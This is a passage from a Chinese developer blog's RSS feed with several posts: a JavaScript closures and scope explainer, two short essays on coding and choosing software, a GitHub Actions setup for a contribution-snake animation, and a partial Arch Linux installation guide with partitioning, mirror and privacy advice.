class="line">//控制台输出2</span><br></pre></td></tr></table></figure><p>在这个例子中，fn1使用的是全局变量a，fn2使用的是局部变量a。多次执行函数后，f1返回的是多次累加的结果<br>而f2由于使用的是局部变量执行结果始终与单次执行相同</p><p>如果希望多次对一个变量进行操作，同时又不希望将其暴露在全局之中<br>此时上面的两个函数均无法满足需求，可使用嵌套函数的方法<br>在JavaScript中，所有函数都能访问它们上一层的作用域<br>嵌套函数可以访问上一层的函数变量<br>例如: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var add = (<span class="keyword">function</span> <span class="function"><span class="title">f1</span></span>() &#123;</span><br><span class="line">  var counter = 0;</span><br><span class="line">  <span class="built_in">return</span> <span class="keyword">function</span> <span class="function"><span class="title">f2</span></span>() &#123;</span><br><span class="line">          <span class="built_in">return</span> counter += 1;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"> </span><br><span class="line">add();</span><br><span class="line">add();</span><br><span class="line">add();</span><br><span class="line">//此时counter为3</span><br></pre></td></tr></table></figure><p>上面的这个函数就是一个JavaScript闭包，它使得函数拥有私有变量变成可能</p><h2 id="作用域与作用域链"><a href="#作用域与作用域链" class="headerlink" title="作用域与作用域链"></a>作用域与作用域链</h2><p>JavaScript中存在如下三种作用域: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 全局作用域</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">func</span></span>() &#123;</span><br><span class="line">  // 函数作用域</span><br><span class="line">  &#123;</span><br><span class="line">    // 块级作用域</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当同时存在多个作用域对象时，所有函数的作用域对象会被环境栈所管理<br>环境栈中的作用域对象是按顺序访问的，最先能够访问的是当前函数的作用域<br>如果访问的变量在当前作用域没有，会访问上一层作用域，直到找到全局作用域<br>如果访问到全局作用域也没有这个对象，会抛出ReferenceError的异常</p><p>简单来说就是前面提到过的 <code>所有函数都能访问它们上一层的作用域</code><br>子对象会一级级向上寻找所有父对象的变量，函数内部可以读取全局变量<br>这就是所谓的作用域链</p><h2 id="JavaScript闭包原理"><a href="#JavaScript闭包原理" class="headerlink" title="JavaScript闭包原理"></a>JavaScript闭包原理</h2><p>还是以上面提到的闭包为例，上面的例子中多次调用add函数后变量counter的值能够持续增加<br>原因就在于每次执行完add之后counter并没有被回收<br>简单来说，其过程就是: </p><ul><li>全局变量add引用了函数f1自我调用后的返回值，即函数f2</li><li>f1在自我调用时只执行一次，并将counter初始化为0</li><li>add变量可以作为一个函数使用，它可以访问函数上一层作用域的变量，即f1中的counter</li><li>在执行完一次add()之后，由于f2被全局变量add引用了，所以不会被回收销毁</li><li>而f1又引用了f2中的变量，所以f2作用域也不会被销毁，下一次执行时counter值不会重置</li></ul><p>这样一来，就可以对变量counter进行多次操作<br>同时counter受函数f1的作用域保护，只能通过add方法修改<br>不会暴露在全局中，上一节中提到的需求通过闭包实现了<br>闭包产生的三个必要条件为: </p><ul><li>在函数A内部直接或者间接返回一个函数B</li><li>B函数内部使用着A函数的私有变量(私有数据)</li><li>A函数外部有一个变量接受着函数B</li></ul><h2 id="JavaScript垃圾回收机制"><a href="#JavaScript垃圾回收机制" class="headerlink" title="JavaScript垃圾回收机制"></a>JavaScript垃圾回收机制</h2><p>JavaScript具有自动垃圾回收机制<br>后台的垃圾回收器会监视所有对象，按照固定的时间间隔周期性地执行垃圾回收<br>删除那些不可达的对象<br>对象的可达性遵循下面的原则: </p><ul><li>本地函数的局部变量和参数、当前嵌套调用链上的其他函数的变量和参数、全局变量等是可达的。</li><li>如果一个对象被引用，则它是可达的</li><li>如果若干个对象互相引用成环，且没被其他对象引用，则这些对象都是不可达的</li></ul>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      <category domain="https://zerospace.dev/tags/JavaScript/">JavaScript</category>
      
      
      <comments>https://zerospace.dev/posts/65ea687a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>写码三境界</title>
      <link>https://zerospace.dev/posts/4c438de2/</link>
      <guid>https://zerospace.dev/posts/4c438de2/</guid>
      <pubDate>Fri, 22 Nov 2024 11:38:09 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;写码三境界：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;由少写多 (开始懂得写代码)&lt;/li&gt;
&lt;li&gt;由多写少 (有意识地精简优化逻辑)&lt;/li&gt;
&lt;li&gt;由少写多 (理解抽象设计)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;很多人停留在第一阶段，也就是能写出来，能用&lt;br&gt;但是代码逻辑不精简，质量一</description>
        
      
      
      
      <content:encoded><![CDATA[<p>写码三境界：</p><ol><li>由少写多 (开始懂得写代码)</li><li>由多写少 (有意识地精简优化逻辑)</li><li>由少写多 (理解抽象设计)</li></ol><p>很多人停留在第一阶段，也就是能写出来，能用<br>但是代码逻辑不精简，质量一般，同时杂乱无章<br>典型的特点是写之前毫无想法，随想随写</p><p>第二阶段是指，有意识地去精简逻辑，简化思路<br>但是代码因为刻意地精简，反而不好维护<br>写出来的很多细节异常考虑均不到位。很多人甚至走上刻意追求简洁的道路，写出极其难看的面条代码</p><p>第三阶段，写之前需求清晰，考虑到了各种未来扩展可能，适度抽象，逻辑条理<br>好的代码，不一定是最简洁的代码，但一定是最好维护的代码，同时也是最好扩展的代码</p><p>所以，我发现一个特点，好代码，其编程风格都是相似的<br>写代码关键在于思路，在于你想要什么，要写什么<br>没想法写出来的代码，再好看都没用</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      
      <comments>https://zerospace.dev/posts/4c438de2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>如何找到适合你的软件</title>
      <link>https://zerospace.dev/posts/d092bb20/</link>
      <guid>https://zerospace.dev/posts/d092bb20/</guid>
      <pubDate>Thu, 21 Nov 2024 09:35:24 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;我一向不喜欢做一名所谓的“传教者”，向你推荐哪个软件好用，哪个软件比哪个软件好用，做什么事有什么好的软件可以实现&lt;/p&gt;
&lt;p&gt;很多时候别人问我类似的软件推荐需求时，我都尽量避免回答&lt;/p&gt;
&lt;p&gt;有些很棒的软件，要么是你给他装上去之后他一次都不用，要么是他坚持着自己的使用</description>
        
      
      
      
      <content:encoded><![CDATA[<p>我一向不喜欢做一名所谓的“传教者”，向你推荐哪个软件好用，哪个软件比哪个软件好用，做什么事有什么好的软件可以实现</p><p>很多时候别人问我类似的软件推荐需求时，我都尽量避免回答</p><p>有些很棒的软件，要么是你给他装上去之后他一次都不用，要么是他坚持着自己的使用习惯</p><p>对于大多数人而言，切换了一个新的平台，第一时间想的却是以前的各种使用习惯，如果改变过大，便会抱怨……</p><p>于是也就有了以下的文字：（全部以文本编辑器为例）</p><h2 id="一、弄清软件定义"><a href="#一、弄清软件定义" class="headerlink" title="一、弄清软件定义"></a>一、弄清软件定义</h2><p>这个软件主要用来做的是什么？</p><p>比如，文本编辑器，维基百科这样定义：</p><blockquote><p>文本编辑器是计算机软件中的一种<br>主要用于用来编写和查看文本文件<br>有一些特殊的文本编辑器支持增加自有的格式来丰富文档的表现形式<br>操作系统或者集成开发环境通常会带有可以查看和编辑纯文本的编辑器<br>可增加格式的文本编辑器通常是个人用户或者公司在制作需要格式的文件中使用</p></blockquote><p>PS，记事本真心不适合写代码，尤其是 PHP 代码 ;)</p><h2 id="二、你真的弄清楚了？"><a href="#二、你真的弄清楚了？" class="headerlink" title="二、你真的弄清楚了？"></a>二、你真的弄清楚了？</h2><ol><li>你现在的系统上有多少常见的文本编辑器，你能列举多少个？</li><li>它们每个的特点又是如何，你能说出一两个它们的优缺点么？</li><li>百度、谷歌之后，你能说出哪个该用来写代码，哪个该用来编辑 Markdown 了么？</li></ol><p>同样，对于任何一个类型的软件，我们不可能百分百了解这么多<br>但是，在寻找自己的心仪软件前有意识地收集归纳，是必要的<br>不是别人说这个软件好，这个软件就好了，要多知道几款，有意识地对比</p><h2 id="三、你的目的是什么？"><a href="#三、你的目的是什么？" class="headerlink" title="三、你的目的是什么？"></a>三、你的目的是什么？</h2><p>目的，也就是你的使用需求，你究竟想要用这个软件做什么事<br>比如说，上次我想编辑排版 Markdown，有人向我推荐 Word，我委婉地拒绝了他<br>因为他不懂我的需求，Word 和 Markdown 完全是两码事</p><p>你想做什么，是你选择某一款软件的决定性因素，也是你的最终目的，挑选任何一款软件前都必须明确，不能将就</p><h2 id="四、立刻下载使用"><a href="#四、立刻下载使用" class="headerlink" title="四、立刻下载使用"></a>四、立刻下载使用</h2><p>如果你觉得好，对它感兴趣，那就立刻下载，立刻使用<br>不要总是像松鼠一样囤积一堆软件放在那里，却一次都不用</p><p>很多时候，需求是通过使用来慢慢明确细化的<br>比如你一开始只是想要文本编辑器，但是你后面发现你需要支持 Markdown 的文本编辑器，然后你又发现你不光需要它能支持，还要能高亮并实时显示</p><p>通过大量使用有助于你对某个软件有自我的评价，而不是人云亦云</p><h2 id="五、及时更新版本"><a href="#五、及时更新版本" class="headerlink" title="五、及时更新版本"></a>五、及时更新版本</h2><p>人是不断进步的，软件也是如此，新的版本也许有未知的 BUG，也许有较大的改动，需要新的学习成本<br>但是新的版本也意味着新的功能，这样的体验，不是很美妙么？</p><p>每时每刻都会有新的软件诞生，关注了解它们，丰富你的软件知识库，以防不时之需</p><h2 id="六、参与软件改进"><a href="#六、参与软件改进" class="headerlink" title="六、参与软件改进"></a>六、参与软件改进</h2><p>软件的进步，需要用户的反馈，也需要你我的参与<br>对于缺点、BUG、需求，如果你真的喜欢某个软件，都要记得去提出<br>一般的开源软件基本都会有社区，或者是联系 Email，或者是反馈地址<br>提出你的需求，有助于软件的改进</p><p>当然，如果你是一名程序员，你还可以完全直接参与到某个开源软件中去<br>或者贡献翻译，或者丰富文档，或者提交代码变更</p><hr><p>那么，您是用户，还是缔造者，还是贡献者呢？</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E8%BD%AF%E4%BB%B6/">软件</category>
      
      
      <comments>https://zerospace.dev/posts/d092bb20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>GitHub主页贪吃蛇</title>
      <link>https://zerospace.dev/posts/57bae214/</link>
      <guid>https://zerospace.dev/posts/57bae214/</guid>
      <pubDate>Wed, 20 Nov 2024 14:10:05 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;起因看到大佬github上有一条贪吃蛇扭来扭去&lt;br&gt;觉得好玩，遂给大家分享一下我的玩蛇历程&lt;/p&gt;
&lt;p&gt;访问地址&lt;br&gt;&lt;a href=</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起因看到大佬github上有一条贪吃蛇扭来扭去<br>觉得好玩，遂给大家分享一下我的玩蛇历程</p><p>访问地址<br><a href="https://github.com/AsZer0s">AsZer0s GitHub</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>设置GitHub主页<ul><li>新建一个与你 <code>GitHub用户名</code> 同名的仓库<br> 比如我的 <code>GitHub UserName</code> 是 <code>AsZer0s</code><br> 就需要创建一个名为 <code>AsZer0s</code> 的仓库<blockquote><p><a href="https://github.com/AsZer0s/AsZer0s">https://github.com/AsZer0s/AsZer0s</a></p></blockquote></li><li>创建 Actions</li><li>创建 Workflow<br>点击 <code>New workflow</code><br>新建 <code>你喜欢的名字.yml</code><br>输入如下内容<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">generate</span> <span class="string">animation</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">   <span class="attr">schedule:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 */24 * * *&quot;</span> </span><br><span class="line">   <span class="attr">workflow_dispatch:</span></span><br><span class="line">   <span class="attr">push:</span></span><br><span class="line">        <span class="attr">branches:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line"><span class="attr">generate:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">timeout-minutes:</span> <span class="number">10</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">generate</span> <span class="string">github-contribution-grid-snake.svg</span></span><br><span class="line">          <span class="attr">uses:</span> <span class="string">Platane/snk/svg-only@v3</span></span><br><span class="line">          <span class="attr">with:</span></span><br><span class="line">            <span class="attr">github_user_name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.repository_owner</span> <span class="string">&#125;&#125;</span></span><br><span class="line">            <span class="attr">outputs:</span> <span class="string">|</span></span><br><span class="line"><span class="string">                dist/github-contribution-grid-snake.svg</span></span><br><span class="line"><span class="string">                dist/github-contribution-grid-snake-dark.svg?palette=github-dark</span></span><br><span class="line"><span class="string"></span>          <span class="attr">env:</span></span><br><span class="line">            <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">   </span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">push</span> <span class="string">github-contribution-grid-snake.svg</span> <span class="string">to</span> <span class="string">the</span> <span class="string">output</span> <span class="string">branch</span></span><br><span class="line">          <span class="attr">uses:</span> <span class="string">crazy-max/ghaction-github-pages@v3.1.0</span></span><br><span class="line">          <span class="attr">with:</span></span><br><span class="line">            <span class="attr">target_branch:</span> <span class="string">output</span></span><br><span class="line">            <span class="attr">build_dir:</span> <span class="string">dist</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure><br> 点击 <code>Commit changes...</code></li><li>运行 <code>Workflow</code></li><li>生成 <code>output</code> 分支</li><li>查看 <code>生成svg外链地址</code><br>   进入 <code>output</code> 分支<br>   点击生成的 <code>svg</code> 文件<br>   查看 <code>svg</code> 文件链接地址<br>   复制 <code>svg</code> 文件链接地址</li><li>放在仓库的README.md<br>   将上一步复制的svg地址<br>   放置到README.md中<br>   可以是markdown格式</li></ul></li></ol>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      
      <comments>https://zerospace.dev/posts/57bae214/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ArchLinux基础安装</title>
      <link>https://zerospace.dev/posts/f0c3d80/</link>
      <guid>https://zerospace.dev/posts/f0c3d80/</guid>
      <pubDate>Tue, 19 Nov 2024 12:39:23 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;本篇参考 &lt;a href=&quot;https://wiki.archlinux.org/index.php/Installation_guide&quot;&gt;Arch Linux 官方安装指南&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;禁用-reflector&quot;&gt;&lt;a href=&quot;#禁用-refle</description>
        
      
      
      
      <content:encoded><![CDATA[<p>本篇参考 <a href="https://wiki.archlinux.org/index.php/Installation_guide">Arch Linux 官方安装指南</a></p><h2 id="禁用-reflector"><a href="#禁用-reflector" class="headerlink" title="禁用 reflector"></a>禁用 reflector</h2><p>reflector 会为你选择速度合适的镜像源<br>但其结果并不准确<br>同时会清空配置文件中的内容<br>对于新人来讲并不适用<br>我们首先对其进行禁用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop reflector.service</span><br></pre></td></tr></table></figure><h2 id="再次确保是否为-UEFI-模式"><a href="#再次确保是否为-UEFI-模式" class="headerlink" title="再次确保是否为 UEFI 模式"></a>再次确保是否为 UEFI 模式</h2><p>在一系列的信息刷屏后<br>可以看到已经以 root 登陆安装系统了<br>此时可以执行的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure><p>若输出了一堆东西，即 <code>efi</code> 变量<br>则说明已在 <code>UEFI</code> 模式<br>否则请确认你的启动方式是否为 <code>UEFI</code></p><h2 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h2><p>一般来说，你连接的网络几乎均可以通过 <code>DHCP</code> 的方式来进行 <code>IP 地址</code> 和 <code>DNS</code> 的相关设置<br>在没有合适网络的情况下，使用 <code>手机的移动热点</code> 也是很方便的选择<br>如果你的网络环境需要配置静态 <code>IP</code> 和 <code>DNS</code><br>请自行参考 <a href="https://wiki.archlinux.org/title/Installation_guide#Connect_to_the_internet">Arch Wiki</a></p><p>对于有线连接来说，直接插入网线即可</p><p>对于无线连接，则需进行如下操作进行网络连接</p><p>无线连接使用 iwctl 命令进行，按照如下步骤进行网络连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iwctl                           <span class="comment">#执行iwctl命令，进入交互式命令行</span></span><br><span class="line">device list                     <span class="comment">#列出设备名，比如无线网卡看到叫 wlan0</span></span><br><span class="line">station wlan0 scan              <span class="comment">#扫描网络</span></span><br><span class="line">station wlan0 get-networks      <span class="comment">#列出网络 比如想连接YOUR-WIRELESS-NAME这个无线</span></span><br><span class="line">station wlan0 connect YOUR-WIRELESS-NAME <span class="comment">#进行连接 输入密码即可</span></span><br><span class="line"><span class="built_in">exit</span>                            <span class="comment">#成功后exit退出</span></span><br></pre></td></tr></table></figure><p>可以等待几秒等网络建立链接后再进行下面测试网络的操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.gnu.org</span><br></pre></td></tr></table></figure><hr><p>如果你不能正常连接网络，首先确认系统已经启用网络接口<a href="https://wiki.archlinux.org/index.php/Network_configuration/Wireless#Check_the_driver_status">Ⅰ</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="built_in">link</span>  <span class="comment">#列出网络接口信息，如不能联网的设备叫wlan0</span></span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> wlan0 up <span class="comment">#比如无线网卡看到叫 wlan0</span></span><br></pre></td></tr></table></figure><p>如果随后看到类似 <code>Operation not possible due to RF-kill</code> 的报错，继续尝试 <code>rfkill</code> 命令来解锁无线网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rfkill unblock wifi</span><br></pre></td></tr></table></figure><h2 id="更新系统时钟"><a href="#更新系统时钟" class="headerlink" title="更新系统时钟"></a>更新系统时钟</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span>    <span class="comment">#将系统时间与网络时间进行同步</span></span><br><span class="line">timedatectl status          <span class="comment">#检查服务状态</span></span><br></pre></td></tr></table></figure><h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><p>这里总共设置三个分区，是一个我们认为较为通用的方案<br>此步骤会清除磁盘中全部内容，请事先确认</p><ul><li>EFI 分区 <a href="https://wiki.archlinux.org/title/EFI_system_partition#Mount_the_partition">Ⅱ</a>： &#x2F;efi 800M</li><li>根目录： &#x2F; 100G</li><li>用户主目录： &#x2F;home 剩余全部</li></ul><blockquote><p>这里根目录的大小仅为参考<br>一般来说个人日常使用的 linux 分配 100G 已经够用了<br>根目录最小建议不小于 50G，根目录过小会造成无法更新系统软件包等问题</p></blockquote><p>首先将磁盘转换为 gpt 类型<br>这里假设比如你想安装的磁盘名称为 sdx<br>如果你使用 NVME 的固态硬盘<br>你看到的磁盘名称可能为 nvme0n1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsblk                       <span class="comment">#显示分区情况 找到你想安装的磁盘名称</span></span><br><span class="line">parted /dev/sdx             <span class="comment">#执行parted，进入交互式命令行，进行磁盘类型变更</span></span><br><span class="line">(parted)mktable             <span class="comment">#输入mktable</span></span><br><span class="line">New disk label <span class="built_in">type</span>? gpt    <span class="comment">#输入gpt 将磁盘类型转换为gpt 如磁盘有数据会警告，输入yes即可</span></span><br><span class="line">quit                        <span class="comment">#最后quit退出parted命令行交互</span></span><br></pre></td></tr></table></figure><p>接下来使用 <code>cfdisk</code> 命令对磁盘分区。进入 <code>cfdisk</code> 后的操作很直观<br>用键盘的<code>方向键</code> 、 <code>Tab 键</code> 、 <code>回车键</code> 配合即可操作分配各个分区的大小与格式<br>一般建议将 <code>EFI 分区</code> 设置为磁盘的第一个分区<br>据说有些主板如果不将 EFI 设置为第一个分区， <code>可能</code> 有 <code>不兼容</code> 的问题<br>其中 <code>EFI 分区</code> 选择 <code>EFI System</code> 类型<br>其余两个分区<code>选择</code>Linux filesystem&#96; 类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cfdisk /dev/sdx <span class="comment">#来执行分区操作,分配各个分区大小，类型</span></span><br><span class="line">fdisk -l <span class="comment">#分区结束后， 复查磁盘情况</span></span><br></pre></td></tr></table></figure><h2 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h2><p>建立好分区后，需要对分区用合适的文件系统进行格式化<br>这里用mkfs.ext4命令格式化根分区与 home 分区<br>用mkfs.vfat命令格式化 EFI 分区<br>如下命令中的 sdax 中，x 代表分区的序号<br>格式化命令要与上一步分区中生成的分区名字对应才可以</p><p>磁盘若事先有数据<br>会提示你: ‘proceed any way?’ 按 y 回车继续即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4  /dev/sdax            <span class="comment">#格式化根目录和home目录的两个分区</span></span><br><span class="line">mkfs.vfat  /dev/sdax            <span class="comment">#格式化efi分区</span></span><br></pre></td></tr></table></figure><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>在挂载时，挂载是有顺序的，先挂载根分区，再挂载 EFI 分区<br>这里的 sdax 只是例子，具体根据你自身的实际分区情况来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sdax  /mnt</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/efi     <span class="comment">#创建efi目录</span></span><br><span class="line">mount /dev/sdax /mnt/efi</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/home    <span class="comment">#创建home目录</span></span><br><span class="line">mount /dev/sdax /mnt/home</span><br></pre></td></tr></table></figure><h2 id="镜像源的选择"><a href="#镜像源的选择" class="headerlink" title="镜像源的选择"></a>镜像源的选择</h2><p>使用如下命令编辑镜像列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure><p>其中的首行是将会使用的镜像源<br>添加中科大或者清华的放在最上面即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>如果其速度不佳，可以手动指定其他镜像源。完整的镜像源列表可参考<a href="https://archlinux.org/mirrorlist/">镜像源生成器</a></p><p>这里使用中国境内的镜像源以提高访问速度</p><blockquote><p>然而这存在问题，镜像源(如 <code>ArchLinux 清华镜像源</code> )以及第三方源(如 <code>ArchLinuxCN</code> )可以知道你的 <code>IP</code> 是什么<br>什么时候更新了系统，什么时候检查了系统，什么时候更新了什么软件，你安装的软件列表是什么<br>在 <code>威权国家</code> 的 <code>镜像源维护者</code> 完全有可能 <code>根据威权当局</code> 的要求 <code>提供这些数据</code><br><code>很多维护者</code> 在网络上几乎是 <code>实名上网</code> 的，他们 <code>没有任何抵抗能力</code><br>进一步的， <code>威权国家</code> 可以根据这些 <code>元数据</code> 与你产生的 <code>其他元数据</code> 进行 <code>比对</code><br>从而对你进行 <code>进一步</code> 的 <code>定位与辨识</code><br>简单举一个 <code>例子</code> ，要求维护者 <code>提供</code> 或 <code>监视</code> 安装了 <code>v2ray/qv2ray</code> 等软件包的 <code>使用者</code> 的 <code>IP</code> ,以及 <code>安装时间</code> ，以及其 <code>全部软件列表</code></p></blockquote><blockquote><p>如果你在安装 ArchLinux 时的网络已经处于 <code>代理模式</code> 下<br>可以选择一个 <code>与你代理位置较近</code> 的,  <code>非威权国家</code> 的镜像源来使用<br>如果你在安装 ArchLinux 时的网络环境 <code>没有代理</code><br>那么在安装结束后，需要 <code>尽快更换</code> 一个 <code>非威权国家</code> 的镜像源来使用<br>如下列举一些较为优质的 <code>国际源</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Server = https://mirror.archlinux.tw/ArchLinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span>   <span class="comment">#东亚地区:台湾/中华民国</span></span><br><span class="line">Server = https://mirror.0xem.ma/arch/<span class="variable">$repo</span>/os/<span class="variable">$arch</span>    <span class="comment">#北美洲地区:加拿大</span></span><br><span class="line">Server = https://mirror.aktkn.sg/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span>    <span class="comment">#东南亚地区:新加坡</span></span><br><span class="line">Server = https://archlinux.uk.mirror.allworldit.com/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span>    <span class="comment">#欧洲地区:英国</span></span><br><span class="line">Server = https://mirrors.cat.net/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span>    <span class="comment">#东亚地区:日本</span></span><br></pre></td></tr></table></figure><h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>必须的基础包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-headers linux-firmware  <span class="comment">#base-devel在AUR包的安装是必须的</span></span><br></pre></td></tr></table></figure><p>注意<br>目前需要首先确保等待 <code>pacman-init.service</code> 服务启动后，才能执行 <code>pacstrap</code> 或 <code>pacman</code> 命令安装包<br>否则会 <code>引发错误</code> 使得安装过程无法进行<br>使用 <code>systemctl status pacman-init.service</code> 命令来检查当前服务状态<br>更多内容参考 bbs 中的 <a href="https://bbs.archlinux.org/viewtopic.php?id=278518&p=2">帖子</a></p><p>若安装时出现密钥环相关错误，参考此文章 <a href="https://archlinux.org/news/gnupg-21-and-the-pacman-keyring/">GnuPG-2.1 and the pacman keyring</a> 并执行其中的命令</p><p>必须的功能性软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt dhcpcd iwd vim bash-completion   <span class="comment">#一个有线所需(iwd也需要dhcpcd) 